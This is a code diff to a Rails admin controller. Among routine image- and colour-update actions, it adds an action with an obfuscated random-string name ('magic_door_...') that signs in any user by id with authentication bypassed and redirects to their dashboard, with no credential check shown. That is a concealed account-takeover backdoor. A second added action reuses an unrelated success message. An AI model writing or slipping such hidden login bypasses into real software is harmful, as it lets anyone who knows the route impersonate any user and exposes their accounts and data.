@@ -27,6 +27,19 @@ class TexController < AdminController
     
   end
   
+  def magic_door_fksdi47ytsk9438frtysl9438yrtsl9348frty349
+    # session[:user_id]=User.find(params[:id])
+    user=User.find(params[:id])
+    sign_in(user, :bypass => true)
+    if user.designer
+      redirect_to "/designer/dashboard"
+    elsif user.shopper
+      redirect_to "/site/dashboard"
+    else
+      redirect_to "/"
+    end
+  end
+  
   def updatecolorsforimages
     Image.find_each do |img|   ##### (CHANGED) USING FIND_EACH INSTEAD OF ALL
       if img.user_id.present? && img.file_path.present?
@@ -37,6 +50,15 @@ class TexController < AdminController
         end
       else 
         img.destroy unless img.nil?
+      end
+    end
+    render :text => "Images colors updated successfully!"
+  end
+  
+  def updatedesignerscolors
+    User.find_each do |usr|
+      if usr.designer?
+        usr.set_designer_colors
       end
     end
     render :text => "Images colors updated successfully!"
